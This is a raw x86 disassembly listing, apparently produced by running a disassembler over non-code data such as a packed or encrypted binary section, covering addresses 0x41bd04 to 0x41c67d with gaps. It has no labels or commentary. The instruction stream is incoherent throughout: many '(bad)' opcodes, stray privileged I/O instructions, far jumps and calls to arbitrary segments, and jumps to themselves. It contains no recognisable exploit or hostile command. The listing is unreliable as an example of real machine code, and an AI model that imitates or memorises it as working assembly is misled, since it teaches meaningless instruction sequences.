  41bd04:	test   BYTE PTR [ebx+0x57444cd1],bh
  41bd0a:	sbb    eax,0x78df7ee4
  41bd0f:	and    BYTE PTR [esi+0x12],ch
  41bd12:	and    dl,BYTE PTR [edx]
  41bd14:	jns    0x41bd71
  41bd16:	in     eax,dx
  41bd17:	dec    esi
  41bd18:	test   al,0x94
  41bd1a:	popf   
  41bd1b:	in     eax,0xb4
  41bd1d:	fxch   st(0)
  41bd1f:	pop    es
  41bd20:	mov    esp,0xa3d3ea87
  41bd25:	dec    ebx
  41bd26:	(bad)  
  41bd28:	mov    ds:0xb69412ac,al
  41bd2d:	ret    0x36e9
  41bd30:	xor    eax,0x3cd64503
  41bd35:	cmp    al,0x58
  41bd37:	xchg   ebx,eax
  41bd38:	xor    BYTE PTR ds:0xeb4e4989,ah
  41bd3e:	and    bl,ah
  41bd40:	rol    dl,1
  41bd42:	xchg   ebx,eax
  41bd43:	ds adc al,0x5
  41bd46:	lods   eax,DWORD PTR ds:[esi]
  41bd47:	test   al,0x84
  41bd49:	scas   al,BYTE PTR es:[edi]
  41bd4a:	enter  0xfbbd,0xd8
  41bd4e:	mov    ah,0x7a
  41bd50:	sbb    al,0xc0
  41bd52:	(bad)  
  41bd53:	rcl    BYTE PTR [edx-0x17],cl
  41bd56:	xchg   esi,eax
  41bd57:	and    DWORD PTR [ebx-0x24ec1df6],ebp
  41bd5d:	(bad)  
  41bd5f:	das    
  41bd60:	lods   eax,DWORD PTR ds:[esi]
  41bd61:	fwait
  41bd62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd63:	inc    ebx
  41bd64:	jge    0x41bd18
  41bd66:	dec    eax
  41bd67:	ret    0xc060
  41bd6a:	imul   edx,DWORD PTR [edi+ebx*8-0x56],0xffffffd6
  41bd6f:	(bad)  
  41bd70:	arpl   WORD PTR [edx-0x5b05ce6a],bp
  41bd76:	inc    eax
  41bd77:	jl     0x41bd1f
  41bd79:	jo     0x41bd16
  41bd7b:	pop    ecx
  41bd7c:	aam    0x6
  41bd7e:	jecxz  0x41bdd4
  41bd80:	or     DWORD PTR [esi],ebx
  41bd82:	leave  
  41bd83:	test   DWORD PTR [esi+ebx*4+0x55],edx
  41bd87:	and    ch,BYTE PTR [edx-0x43]
  41bd8a:	pushf  
  41bd8b:	iret   
  41bd8c:	pop    es
  41bd8d:	sub    al,0x89
  41bd8f:	mov    ch,0x26
  41bd91:	jne    0x41bd91
  41bd93:	or     DWORD PTR [edx],edi
  41bd95:	dec    esp
  41bd96:	jb     0x41bdf0
  41bd98:	adc    al,0x9b
  41bd9a:	mov    ebx,0xe1156dfb
  41bd9f:	jmp    0x41bd22
  41bda1:	addr16 cmp ebx,esi
  41bda4:	xchg   edx,eax
  41bda5:	shl    ah,cl
  41bda7:	enter  0x360a,0x2
  41bdab:	js     0x41bd5a
  41bdad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdae:	out    0xa6,al
  41bdb0:	lea    eax,[eax+0x8143c3]
	...
  41be16:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be1c:	imul   edi
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	test   ch,dl
  41be24:	out    dx,al
  41be25:	sub    eax,DWORD PTR [eax+0x26]
  41be28:	add    DWORD PTR [eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    BYTE PTR [edx+0x700b8a4],cl
  41be33:	mov    ah,0x7c
  41be35:	cmp    esi,ebp
  41be37:	repnz xchg edi,eax
  41be39:	popa   
  41be3a:	sbb    DWORD PTR [eax-0x6b93a539],ebp
  41be40:	inc    ecx
  41be41:	push   0xffffffad
  41be43:	fild   QWORD PTR [edx]
  41be45:	in     al,0x3
  41be47:	stos   BYTE PTR es:[edi],al
  41be48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be49:	iret   
  41be4a:	xchg   esp,eax
  41be4b:	jmp    0x4170:0x9f509fe8
  41be52:	aad    0xeb
  41be54:	pop    edx
  41be55:	sar    BYTE PTR [esi-0x38242917],0x57
  41be5c:	in     al,dx
  41be5d:	sbb    al,0xd1
  41be5f:	pop    es
  41be60:	xchg   esp,eax
  41be61:	mov    ecx,0x75fd2bf5
  41be66:	es leave 
  41be68:	cmp    al,BYTE PTR [eax]
  41be6a:	or     al,0xd6
  41be6c:	jae    0x41be33
  41be6e:	scas   al,BYTE PTR es:[edi]
  41be6f:	cmp    ebp,ebx
  41be71:	add    ah,al
  41be73:	adc    BYTE PTR [ecx],cl
  41be75:	ret    
  41be76:	push   esp
  41be77:	sbb    al,0x8f
  41be79:	sti    
  41be7a:	std    
  41be7b:	das    
  41be7c:	popa   
  41be7d:	jmp    0x41be29
  41be7f:	scas   eax,DWORD PTR es:[edi]
  41be80:	xor    eax,DWORD PTR ds:0xb6b6e118
  41be86:	mov    dl,0xd9
  41be88:	or     al,0xaa
  41be8a:	mov    ebp,0x4a596b2f
  41be8f:	sbb    al,al
  41be91:	sub    ebp,DWORD PTR [eax-0x16c542f0]
  41be97:	dec    edi
  41be98:	jb     0x41be2b
  41be9a:	jbe    0x41be56
  41be9c:	int    0xa3
  41be9e:	lea    ecx,[eax]
  41bea0:	je     0x41bea1
  41bea2:	mov    dh,0x4d
  41bea4:	sbb    al,0xd
  41bea6:	push   edx
  41bea7:	popf   
  41bea8:	and    DWORD PTR [ebp+0x21],0x54
  41beac:	stos   BYTE PTR es:[edi],al
  41bead:	sub    dl,al
  41beaf:	sbb    edx,eax
  41beb1:	inc    eax
  41beb2:	repz add DWORD PTR [eax-0x66084b14],0xe1593d67
  41bebd:	and    al,BYTE PTR [esi]
  41bebf:	into   
  41bec0:	jmp    FWORD PTR [esi-0x2775593b]
  41bec6:	jne    0x41be5f
  41bec8:	sar    BYTE PTR [ebp+0x61fdda5f],cl
  41bece:	pop    edx
  41becf:	ins    DWORD PTR es:[edi],dx
  41bed0:	adc    al,ah
  41bed2:	pop    esi
  41bed3:	adc    BYTE PTR [ecx+0x36e35bde],dh
  41bed9:	in     eax,dx
  41beda:	jmp    ebp
  41bedc:	je     0x41bf16
  41bede:	mov    ch,0x5f
  41bee0:	adc    eax,0x322cb995
  41bee5:	faddp  st(6),st
  41bee7:	lds    esp,FWORD PTR [ebx+0x27]
  41beea:	xchg   esi,eax
  41beeb:	mov    edx,DWORD PTR [esi+0x6a]
  41beee:	das    
  41beef:	pop    esp
  41bef0:	call   0xb673:0xb35e2bd0
  41bef7:	popf   
  41bef8:	jecxz  0x41bf0b
  41befa:	dec    edi
  41befb:	jmp    0x1ea1:0x9d1686ce
  41bf02:	fild   QWORD PTR [edi]
  41bf04:	mov    ah,0x3f
  41bf06:	retf   0xf7a4
  41bf09:	or     eax,0xc4d77145
  41bf0e:	ins    DWORD PTR es:[edi],dx
  41bf0f:	mov    ecx,DWORD PTR [edx]
  41bf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf12:	scas   al,BYTE PTR es:[edi]
  41bf13:	fisubr WORD PTR [eax+edx*2+0x68]
  41bf17:	jmp    ecx
  41bf19:	sar    BYTE PTR [edx],1
  41bf1b:	int    0x48
  41bf1d:	aas    
  41bf1e:	outs   dx,BYTE PTR ds:[esi]
  41bf1f:	jb     0x41bebe
  41bf21:	ret    
  41bf22:	push   edx
  41bf23:	mov    edx,0x33b21199
  41bf28:	or     cl,0x59
  41bf2b:	inc    edi
  41bf2c:	or     al,BYTE PTR [ecx]
  41bf2e:	mov    edx,0x8f8d9b16
  41bf33:	push   0xfffffff5
	...
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	loopne 0x41bf2c
  41bfa4:	jmp    DWORD PTR [edx+0x12747]
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [ebp-0x77419a8a],al
  41bfb3:	add    ecx,DWORD PTR [esi-0x61481b19]
  41bfb9:	push   esi
  41bfba:	mov    eax,0x896a25f2
  41bfbf:	aam    0x7d
  41bfc1:	retf   0xf2d7
  41bfc4:	sbb    ebp,DWORD PTR [edi]
  41bfc6:	sub    ch,BYTE PTR [ecx+esi*2-0x5b9d179a]
  41bfcd:	push   0x180c11ed
  41bfd2:	push   es
  41bfd3:	xchg   esp,eax
  41bfd4:	mov    bh,0xa1
  41bfd6:	and    ecx,DWORD PTR [ecx-0x6a2796f0]
  41bfdc:	in     al,0x1f
  41bfde:	push   eax
  41bfdf:	add    DWORD PTR [edx+0x7f],ebx
  41bfe2:	xchg   esp,eax
  41bfe3:	dec    edx
  41bfe4:	jg     0x41bfbe
  41bfe6:	data16 fstp TBYTE PTR [ebx+0x5d]
  41bfea:	lods   al,BYTE PTR ds:[esi]
  41bfeb:	(bad)  
  41bfec:	bound  edx,QWORD PTR [ecx]
  41bfee:	(bad)  
  41bfef:	push   esp
  41bff0:	push   edx
  41bff1:	push   edi
  41bff2:	dec    eax
  41bff3:	push   esp
  41bff4:	retf   
  41bff5:	mov    ch,0x50
  41bff7:	pop    ebp
  41bff8:	add    al,0x82
  41bffa:	jp     0x41c04b
  41bffc:	loopne 0x41c00c
  41bffe:	repnz aad 0xd
  41c001:	xchg   ebp,eax
  41c002:	ins    BYTE PTR es:[edi],dx
  41c003:	retf   0x688d
  41c006:	daa    
  41c007:	mov    edi,0x77f6893d
  41c00c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c00d:	inc    esi
  41c00e:	add    al,dh
  41c010:	mov    ds:0xcec1c601,eax
  41c015:	ret    
  41c016:	push   ds
  41c017:	jge    0x41bfa2
  41c019:	lock dec esi
  41c01b:	cmp    BYTE PTR [ebx-0x4841a411],cl
  41c021:	mov    dl,BYTE PTR [eax+ebp*4]
  41c024:	retf   0x585f
  41c027:	int3   
  41c028:	pop    eax
  41c029:	sub    ebp,ebp
  41c02b:	cmc    
  41c02c:	adc    al,0x2a
  41c02e:	jbe    0x41c096
  41c030:	aas    
  41c031:	out    dx,eax
  41c032:	cmp    al,0xaf
  41c034:	inc    ecx
  41c035:	daa    
  41c036:	or     eax,DWORD PTR ss:[edi]
  41c039:	ret    0xc9e8
  41c03c:	adc    al,0xf7
  41c03e:	(bad)  
  41c03f:	sahf   
  41c040:	lahf   
  41c041:	nop
  41c042:	js     0x41c011
  41c044:	mov    ds:0xa26eca37,eax
  41c049:	mov    ds:0x45c5f1e1,eax
  41c04e:	ds (bad) 
  41c050:	cmp    dh,BYTE PTR [eax+0x53]
  41c053:	sbb    edx,edx
  41c055:	sbb    al,0x44
  41c057:	lds    edi,FWORD PTR [edi]
  41c059:	clc    
  41c05a:	mov    al,0xd4
  41c05c:	sub    ecx,DWORD PTR [edi]
  41c05e:	mov    al,0x24
  41c060:	mov    WORD PTR [edi-0x20],?
  41c063:	div    DWORD PTR ds:0xadcf1ab4
  41c069:	rol    bh,1
  41c06b:	jo     0x41c04f
  41c06d:	nop
  41c06e:	and    al,0x28
  41c070:	push   edi
  41c071:	aad    0x2a
  41c073:	pop    esi
  41c074:	xchg   esi,eax
  41c075:	cmp    ebp,DWORD PTR [eax+edx*8-0x6973ead4]
  41c07c:	leave  
  41c07d:	or     eax,0x39b3286e
  41c082:	aas    
  41c083:	mov    cl,0xb2
  41c085:	mov    ch,0xea
  41c087:	push   edx
  41c088:	(bad)  
  41c089:	add    DWORD PTR [ebx+0x7e92e317],ebp
  41c08f:	imul   edx,DWORD PTR [ebx],0x38
  41c092:	ss shr esp,1
  41c095:	outs   dx,DWORD PTR ds:[esi]
  41c096:	(bad)  
  41c097:	mov    ch,0x6a
  41c099:	fbstp  TBYTE PTR [edi+eax*1+0x67]
  41c09d:	out    0xda,al
  41c09f:	cmc    
  41c0a0:	fnstenv [esi]
  41c0a2:	pusha  
  41c0a3:	mov    BYTE PTR [ecx-0xe3acc8f],al
  41c0a9:	mov    dl,0x30
  41c0ab:	mov    DWORD PTR [ebp-0x2f],eax
  41c0ae:	(bad)  
  41c0af:	icebp  
  41c0b0:	fdiv   DWORD PTR [edi+0xf29ed9]
	...
  41c116:	(bad)  [edx-0x5f]
  41c119:	clc    
  41c11a:	mov    bl,0xfb
  41c11c:	fldcw  WORD PTR [ebx+0x49]
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	mov    ebp,0x69d060f8
  41c125:	inc    esi
  41c126:	dec    esi
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx+0x109b69bb],bl
  41c133:	int3   
  41c134:	aaa    
  41c135:	ficomp DWORD PTR [ebp-0x49e0e265]
  41c13b:	pop    edi
  41c13c:	call   DWORD PTR [eax-0x79c7aceb]
  41c142:	daa    
  41c143:	mov    al,0xe
  41c145:	(bad)  
  41c146:	std    
  41c147:	jnp    0x41c125
  41c149:	into   
  41c14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c14b:	mov    gs,WORD PTR [ecx+ecx*4-0x4750b6aa]
  41c152:	adc    BYTE PTR [edi+0x1e],ch
  41c155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c156:	sub    al,ch
  41c158:	test   BYTE PTR [eax-0x30],al
  41c15b:	adc    DWORD PTR [edi+0x36],esi
  41c15e:	push   edi
  41c15f:	lods   al,BYTE PTR ds:[esi]
  41c160:	sbb    al,BYTE PTR [ecx-0x306d8f25]
  41c166:	sub    ah,bh
  41c168:	or     bl,dl
  41c16a:	repz mov ?,WORD PTR [edx+eax*8+0xd]
  41c16f:	jge    0x41c1eb
  41c171:	sbb    eax,0x9033d553
  41c176:	sub    al,0x3b
  41c178:	mov    ecx,0xf45ba608
  41c17d:	add    dl,BYTE PTR [eax-0x23]
  41c180:	and    dh,BYTE PTR [ecx-0x69]
  41c183:	dec    esp
  41c184:	fs push esp
  41c186:	mov    eax,ds:0x94061a0a
  41c18b:	sbb    cl,al
  41c18d:	mov    ecx,edi
  41c18f:	dec    edx
  41c190:	enter  0x5f9e,0xb
  41c194:	aaa    
  41c195:	mov    ecx,0x2387d741
  41c19a:	ds loope 0x41c1f9
  41c19d:	test   eax,0xf4835ea8
  41c1a2:	pop    es
  41c1a3:	cmp    eax,0x41bb3343
  41c1a8:	jge    0x41c1f0
  41c1aa:	fldcw  WORD PTR [eax]
  41c1ac:	jg     0x41c1a6
  41c1ae:	out    0xeb,al
  41c1b0:	xor    al,0x8c
  41c1b2:	aas    
  41c1b3:	rcr    DWORD PTR [esi-0x65],1
  41c1b6:	pop    ebx
  41c1b7:	push   ebx
  41c1b8:	inc    ebx
  41c1b9:	push   esp
  41c1ba:	rol    BYTE PTR [esi+esi*2],1
  41c1bd:	arpl   WORD PTR [eax],bp
  41c1bf:	cmp    ebx,DWORD PTR [ebx]
  41c1c1:	mov    DWORD PTR [esi+ecx*8-0x5f],ecx
  41c1c5:	data16 and BYTE PTR [eax+edi*8-0x32],ah
  41c1ca:	add    ah,BYTE PTR [ecx-0x36]
  41c1cd:	stc    
  41c1ce:	xor    DWORD PTR [ecx],ecx
  41c1d0:	bound  ecx,QWORD PTR [edx]
  41c1d2:	out    dx,al
  41c1d3:	out    0xd7,al
  41c1d5:	xchg   edx,eax
  41c1d6:	push   esi
  41c1d7:	cld    
  41c1d8:	fstp   TBYTE PTR [ebx+edi*1]
  41c1db:	loop   0x41c19a
  41c1dd:	clc    
  41c1de:	jbe    0x41c18f
  41c1e0:	and    BYTE PTR [ecx-0x295836fa],al
  41c1e6:	scas   al,BYTE PTR es:[edi]
  41c1e7:	mov    dl,0x46
  41c1e9:	sbb    DWORD PTR ds:0x9e32eaec,esi
  41c1ef:	scas   al,BYTE PTR es:[edi]
  41c1f0:	out    dx,eax
  41c1f1:	(bad)  
  41c1f2:	out    0x48,eax
  41c1f4:	scas   eax,DWORD PTR es:[edi]
  41c1f5:	jnp    0x41c201
  41c1f7:	cdq    
  41c1f8:	xchg   edi,eax
  41c1f9:	hlt    
  41c1fa:	loopne 0x41c1ed
  41c1fc:	ss dec eax
  41c1fe:	mov    bh,0xd0
  41c200:	mov    ecx,0x541a99fc
  41c205:	dec    edi
  41c206:	call   0x5c5220d7
  41c20b:	test   eax,0xfbd1ed48
  41c210:	cli    
  41c211:	cli    
  41c212:	fisub  DWORD PTR [ebx-0x6e]
  41c215:	dec    eax
  41c216:	inc    ebp
  41c217:	jo     0x41c272
  41c219:	pop    esi
  41c21a:	jecxz  0x41c26c
  41c21c:	or     eax,0xff74f6e2
  41c221:	xchg   BYTE PTR ds:0x73baebff,cl
  41c227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c228:	pop    es
  41c229:	ficom  DWORD PTR [edi+0xf]
  41c22c:	mov    BYTE PTR [edx+0x46bc1143],cl
  41c232:	xor    bl,0x51
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	or     BYTE PTR [edi],ch
  41c2a4:	mov    ds:0x1295585,al
  41c2a9:	add    BYTE PTR [edi],al
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [esi-0x2d],bh
  41c2b0:	retf   0x3078
  41c2b3:	xchg   edx,eax
  41c2b4:	and    al,bh
  41c2b6:	fwait
  41c2b7:	test   al,0x9d
  41c2b9:	xor    al,0x9c
  41c2bb:	mov    al,0x9b
  41c2bd:	mov    bl,0xfe
  41c2bf:	es cli 
  41c2c1:	push   ebx
  41c2c2:	xor    eax,eax
  41c2c4:	jecxz  0x41c2a3
  41c2c6:	int3   
  41c2c7:	cmp    BYTE PTR [eax+0x70cc7339],cl
  41c2cd:	sub    esp,0xffb3694
  41c2d3:	dec    esi
  41c2d4:	sar    DWORD PTR [esi-0x7b81359c],cl
  41c2da:	xchg   ebx,eax
  41c2db:	lds    edi,FWORD PTR [ecx]
  41c2dd:	sub    al,0x78
  41c2df:	pop    esp
  41c2e0:	xor    eax,0x6b8d7d39
  41c2e5:	into   
  41c2e6:	dec    edx
  41c2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2e8:	scas   eax,DWORD PTR es:[edi]
  41c2e9:	ret    0x649c
  41c2ec:	lods   al,BYTE PTR ds:[esi]
  41c2ed:	adc    bl,BYTE PTR [edi-0x1b7c6da2]
  41c2f3:	out    dx,eax
  41c2f4:	ins    DWORD PTR es:[edi],dx
  41c2f5:	add    eax,0x1d2e5180
  41c2fa:	ja     0x41c358
  41c2fc:	mov    ds:0x547516b9,al
  41c301:	shl    DWORD PTR [ecx+eax*1],1
  41c304:	cdq    
  41c305:	cmp    BYTE PTR [ecx+edi*2-0x5f],bh
  41c309:	add    eax,0x7c6b8bee
  41c30e:	or     al,0xf3
  41c310:	and    al,0xa
  41c312:	test   al,0x87
  41c314:	sbb    ebp,DWORD PTR [ecx-0x2f]
  41c317:	jmp    0x41c311
  41c319:	stos   BYTE PTR es:[edi],al
  41c31a:	ja     0x41c348
  41c31c:	ror    BYTE PTR [ecx+0x1d4e0482],1
  41c322:	sbb    eax,0xf9f8a136
  41c327:	xor    eax,0xa8326dc2
  41c32c:	fadd   st(7),st
  41c32e:	aaa    
  41c32f:	sbb    DWORD PTR [ebx],ebp
  41c331:	ds push edx
  41c333:	push   cs
  41c334:	add    DWORD PTR [ecx+0x13],ebx
  41c337:	and    DWORD PTR [esi],ebp
  41c339:	dec    esp
  41c33a:	test   eax,0x2e9e1914
  41c33f:	push   esi
  41c340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c341:	aas    
  41c342:	mov    ah,0x76
  41c344:	arpl   di,bx
  41c346:	pushf  
  41c347:	push   ebp
  41c348:	jecxz  0x41c37f
  41c34a:	pop    esp
  41c34b:	je     0x41c2e8
  41c34d:	clc    
  41c34e:	ja     0x41c361
  41c350:	mov    ah,0xd7
  41c352:	xlat   BYTE PTR ds:[ebx]
  41c353:	pop    eax
  41c354:	test   BYTE PTR ss:[edx-0x54],dl
  41c358:	pop    edi
  41c359:	and    dh,BYTE PTR [ecx+esi*1+0x69]
  41c35d:	scas   al,BYTE PTR es:[edi]
  41c35e:	and    BYTE PTR [ebx+0x1],ch
  41c361:	js     0x41c305
  41c363:	dec    ebx
  41c364:	aam    0x5c
  41c366:	aaa    
  41c367:	sub    al,0xe7
  41c369:	and    eax,0x6c79900e
  41c36e:	out    dx,al
  41c36f:	push   ebp
  41c370:	aas    
  41c371:	in     al,0x1d
  41c373:	pop    es
  41c374:	cmc    
  41c375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c376:	je     0x41c34c
  41c378:	mov    dl,0x36
  41c37a:	lods   al,BYTE PTR ds:[esi]
  41c37b:	dec    esp
  41c37c:	scas   eax,DWORD PTR es:[edi]
  41c37d:	in     eax,0x5e
  41c37f:	fst    DWORD PTR [ecx]
  41c381:	mov    ecx,0x6caa8887
  41c386:	add    eax,0xde85557c
  41c38b:	mov    eax,ds:0xafa9fd13
  41c390:	call   0xac9c:0xe8ceab99
  41c397:	inc    esp
  41c398:	jno    0x41c3d9
  41c39a:	add    bh,BYTE PTR [edi]
  41c39c:	(bad)  [ebx+0x9ae2143]
  41c3a2:	hlt    
  41c3a3:	ret    
  41c3a4:	jge    0x41c3c6
  41c3a6:	test   BYTE PTR [ebp-0x1],bh
  41c3a9:	ror    BYTE PTR [ecx],0xf5
  41c3ac:	clc    
  41c3ad:	cmp    BYTE PTR [esi],0x8f
  41c3b0:	leave  
  41c3b1:	mov    dl,dh
  41c3b3:	js     0x41c3d1
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [edi+ebx*2-0x1a]
  41c424:	repnz call 0x107:0x12a5c
  41c42c:	add    BYTE PTR [eax],al
  41c42e:	gs jb  0x41c45b
  41c431:	add    ah,al
  41c433:	mov    bl,0xa9
  41c435:	pop    eax
  41c436:	pop    esp
  41c437:	out    0xa4,eax
  41c439:	jno    0x41c436
  41c43b:	mov    dh,0xaf
  41c43d:	iret   
  41c43e:	(bad)  
  41c43f:	je     0x41c418
  41c441:	jbe    0x41c444
  41c443:	inc    edi
  41c444:	fidivr WORD PTR [ebx+eax*8+0x25501f4d]
  41c44b:	jne    0x41c492
  41c44d:	(bad)  
  41c44e:	mov    bl,0x50
  41c450:	pop    edi
  41c451:	bswap  esp
  41c453:	adc    al,0xd
  41c455:	in     eax,dx
  41c456:	xor    ch,BYTE PTR [ecx+0x618f869]
  41c45c:	mov    eax,ds:0x91d50767
  41c461:	mov    eax,0x2c2bb347
  41c466:	hlt    
  41c467:	fs nop
  41c469:	mov    BYTE PTR [ecx],cl
  41c46b:	(bad)
  41c46e:	sub    BYTE PTR [esi+ebx*4],ch
  41c471:	inc    ecx
  41c472:	idiv   BYTE PTR [eax-0x58]
  41c475:	and    BYTE PTR [edx+0x51ef1cd1],dl
  41c47b:	pop    es
  41c47c:	jg     0x41c4a4
  41c47e:	jnp    0x41c421
  41c480:	call   0xd96cef3c
  41c485:	lea    eax,[edi+0x56806675]
  41c48b:	mov    cl,0x40
  41c48d:	mov    ds:0xf1fb8662,al
  41c492:	jmp    0x16b8:0x2c9ebdc1
  41c499:	adc    al,0x9d
  41c49b:	and    edx,DWORD PTR [edx-0x6dfb7413]
  41c4a1:	fisub  DWORD PTR [ebx+ebp*8]
  41c4a4:	and    eax,edx
  41c4a6:	xor    DWORD PTR [edx+eiz*1],ecx
  41c4a9:	and    ah,BYTE PTR [edx]
  41c4ab:	sub    al,0xed
  41c4ad:	xchg   ecx,eax
  41c4ae:	pop    edi
  41c4af:	add    edx,DWORD PTR [ecx+0x58]
  41c4b2:	add    ecx,DWORD PTR [edx+0x72]
  41c4b5:	out    dx,al
  41c4b6:	xchg   ebp,eax
  41c4b7:	les    ecx,FWORD PTR [ebx-0x34]
  41c4ba:	iret   
  41c4bb:	or     BYTE PTR [esi+0x13],cl
  41c4be:	fidivr WORD PTR [esi-0x1b]
  41c4c1:	and    BYTE PTR [ecx],bl
  41c4c3:	outs   dx,BYTE PTR ds:[esi]
  41c4c4:	jne    0x41c4f5
  41c4c6:	inc    edx
  41c4c7:	xor    cl,BYTE PTR [edx+0x3b]
  41c4ca:	mov    ch,0xd1
  41c4cc:	cmp    edx,DWORD PTR [ebp+0x5560a16]
  41c4d2:	or     eax,0x8303465f
  41c4d7:	aas    
  41c4d8:	mov    bl,0xe5
  41c4da:	push   esp
  41c4db:	fcom   DWORD PTR [ebp-0x47456bd0]
  41c4e1:	mov    dh,0x49
  41c4e3:	adc    al,0xaf
  41c4e5:	cs cli 
  41c4e7:	cmp    al,0x63
  41c4e9:	jp     0x41c4fe
  41c4eb:	loope  0x41c538
  41c4ed:	mov    eax,ds:0x45ef3ac
  41c4f2:	gs shl esi,0xb3
  41c4f6:	outs   dx,BYTE PTR ds:[esi]
  41c4f7:	jae    0x41c4b0
  41c4f9:	fmul   st,st(2)
  41c4fb:	adc    eax,ebp
  41c4fd:	adc    al,0x9f
  41c4ff:	mov    eax,0x3866d58b
  41c504:	(bad)  
  41c505:	pop    esp
  41c506:	les    edx,FWORD PTR [ecx+ebx*2+0x68]
  41c50a:	sub    esp,DWORD PTR [ecx]
  41c50c:	ins    BYTE PTR es:[edi],dx
  41c50d:	dec    ebp
  41c50e:	cmp    bl,BYTE PTR [esi+0x2c]
  41c511:	mov    eax,DWORD PTR ds:0xa0f41f8c
  41c518:	jge    0x41c56e
  41c51a:	xor    al,0x94
  41c51c:	icebp  
  41c51d:	fistp  DWORD PTR [ebx-0x422a148d]
  41c523:	loope  0x41c516
  41c525:	fdivr  QWORD PTR [eax-0x21]
  41c528:	mov    ecx,0xfb0ab711
  41c52d:	xchg   ecx,eax
  41c52e:	xchg   BYTE PTR ds:0x61a9b6c,cl
	...
  41c595:	add    ch,al
  41c597:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c59d:	jecxz  0x41c5b9
  41c59f:	push   0x10
  41c5a1:	stc    
  41c5a2:	sbb    DWORD PTR [edx+0x1a],0x12b63d4
  41c5a9:	add    BYTE PTR [edi],al
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR [eax+0x1a83708a],dl
  41c5b3:	in     al,dx
  41c5b4:	into   
  41c5b5:	sbb    ecx,DWORD PTR [ebp-0x1d]
  41c5b8:	dec    ebp
  41c5b9:	cmp    eax,0x3b93a63b
  41c5be:	gs sub al,0xa1
  41c5c1:	xchg   esp,eax
  41c5c2:	out    dx,eax
  41c5c3:	call   0xdd1:0x8c2a23e8
  41c5ca:	(bad)  
  41c5cc:	rcl    BYTE PTR [edi+0x7fd14b31],cl
  41c5d2:	shl    BYTE PTR [eax-0x37fc9543],0x77
  41c5d9:	nop
  41c5da:	adc    dl,BYTE PTR [edx+0x2f]
  41c5dd:	aas    
  41c5de:	popa   
  41c5df:	sbb    DWORD PTR [esi+0x5e510f48],esp
  41c5e5:	pushf  
  41c5e6:	mov    dh,0xe7
  41c5e8:	addr16 jns 0x41c645
  41c5eb:	sub    edi,DWORD PTR [esi+ecx*4]
  41c5ee:	retf   
  41c5ef:	push   0x4a
  41c5f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5f2:	imul   edx,DWORD PTR [eax],0x2a72cf32
  41c5f8:	inc    esp
  41c5f9:	add    eax,0x4659c374
  41c5fe:	cld    
  41c5ff:	inc    edx
  41c600:	outs   dx,DWORD PTR ds:[esi]
  41c601:	cdq    
  41c602:	sbb    DWORD PTR [edi-0x1c046580],ebx
  41c608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c609:	or     BYTE PTR [ebp-0x5899a746],bl
  41c60f:	mov    edx,0xc6b1c51a
  41c614:	inc    ebx
  41c615:	(bad)  
  41c616:	icebp  
  41c617:	push   ebx
  41c618:	and    al,0x54
  41c61a:	fidiv  DWORD PTR [edx-0x37d6e4b9]
  41c620:	xor    edi,eax
  41c622:	mov    esi,0x83b85bae
  41c627:	push   es
  41c628:	es into 
  41c62a:	jo     0x41c5ca
  41c62c:	imul   ebx,DWORD PTR [edx+ecx*2-0x37907],0x5f
  41c634:	outs   dx,DWORD PTR ds:[esi]
  41c635:	add    BYTE PTR [esi],al
  41c637:	clc    
  41c638:	icebp  
  41c639:	or     eax,0xbfc217b5
  41c63e:	mov    cl,0x65
  41c640:	fs mov bh,0x66
  41c643:	cmp    ah,bl
  41c645:	fucomi st,st(3)
  41c647:	out    dx,al
  41c648:	cmp    dl,bh
  41c64a:	stos   BYTE PTR es:[edi],al
  41c64b:	cmp    ch,cl
  41c64d:	pop    edx
  41c64e:	sub    dl,ch
  41c650:	nop
  41c651:	aam    0x47
  41c653:	push   ds
  41c654:	call   0x3da59d01
  41c659:	shl    BYTE PTR [ecx+0x41],1
  41c65c:	addr16 cs mov dh,0x27
  41c660:	and    eax,0x4b9d1b65
  41c665:	pop    ecx
  41c666:	stos   BYTE PTR es:[edi],al
  41c667:	mov    ebp,0xa7b83f69
  41c66c:	mov    ecx,0xf674c5ca
  41c671:	out    dx,al
  41c672:	rcl    dh,1
  41c674:	push   eax
  41c675:	inc    eax
  41c676:	aaa    
  41c677:	push   edi
  41c678:	sub    eax,0xb011f2f6
  41c67d:	out    dx,al
